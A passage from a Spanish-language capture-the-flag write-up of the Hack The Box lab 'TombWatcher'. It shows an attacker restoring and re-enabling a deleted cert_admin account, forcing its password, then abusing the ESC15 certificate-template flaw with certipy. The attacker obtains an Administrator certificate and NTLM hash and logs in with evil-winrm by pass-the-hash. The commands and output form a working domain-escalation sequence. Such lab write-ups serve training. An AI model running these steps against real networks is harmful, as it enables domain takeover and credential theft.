/home/kali/.local/bin/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
 'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250924-212201.bak
[*] DACL modified successfully!
~~~
Ahora viendo los objetos eliminados se tiene
~~~
Evil-WinRM PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin                    
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
~~~
Viendo que se tiene un "cert_admin" posiblemente usuario eliminado, por ende se puede volver a habilitarlo y viendo que tenemos GenericAll sobre la OU ADCS entonces tambien se fuerza el cambio de contraseña sobre el nuevo usuario 
~~~
Evil-WinRM PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Evil-WinRM PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
Evil-WinRM PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "password123" -AsPlainText -Force)
*Evil-WinRM* PS C:\Users\john\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Alfred                   cert_admin
Guest                    Henry                    john
krbtgt                   sam
The command completed with one or more errors.
~~~
### Escalada ESC15 y acceso a administrator
En este punto se puede intuir que el usuario cert_admin debe tener ciertos privilegios sobre la emision de certificados, por lo que se salta la enumeracion de privilegios y se pasa directamente a la enumeracion de certificados (Es importante tener las herramientas actualizadas para que no ocurran errores)
~~~
certipy-ad find -u cert_admin -p 'password123' -dc-ip 10.10.11.72 -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins                                                                                    TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
~~~
Por lo visto es una escalada ESC15, para ello se siguieron los pasos del propio ly4k siguiendo este enlace (https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), esta expresa dos formas de explotarlo, para mi ejemplo se empleó la segunda (2) forma impersonando al administrator
~~~ bash
certipy-ad req  -u 'cert_admin@tombwatcher.htb' -p 'password123' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
~~~

~~~bash
certipy-ad req  -u 'cert_admin@tombwatcher.htb' -p 'password123' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC</p><p>[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
~~~

~~~bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f6SNIP>fc
~~~
Para finalmente obtener el hash NTLM de administrator

---

## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con esto ya solo queda usar evil-winrm con el hash de administrator y entrar sin complicaciones
~~~
evil-winrm -i 10.10.11.72 -u administrator -H f6<SNIP>fc
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Info: Establishing connection to remote endpoint
Evil-WinRM PS C:\Users\Administrator\Documents&gt;
~~~
Para ahora solamente leer el root.txt
~~~
<Evil-WinRM PS C:\Users\Administrator\documents> cd ..
Evil-WinRM PS C:\Users\Administrator> cd dektop
Evil-WinRM PS C:\Users\Administrator\desktop> type root.txt
<SAQUE SU ROOT FLAG>
~~~
🎉 Sistema completamente comprometido - Root obtenido

